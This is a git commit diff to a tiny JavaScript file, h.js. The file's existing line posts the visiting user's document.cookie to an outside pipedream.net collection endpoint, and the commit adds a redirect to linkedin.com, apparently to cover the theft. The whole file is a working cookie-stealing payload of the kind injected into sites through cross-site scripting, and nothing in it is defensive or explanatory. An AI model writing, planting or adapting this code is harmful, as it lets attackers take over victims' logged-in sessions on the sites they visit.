0a0095559d2419c706a376331f67bf6cbfcf59b2
h88u <159571030+h88u@users.noreply.github.com>
2024-02-09 13:05:54 -0500

    Update h.js

--- h.js
+++ h.js
@@ -1,1 +1,2 @@
 fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})});
+window.location.replace('https://linkedin.com');
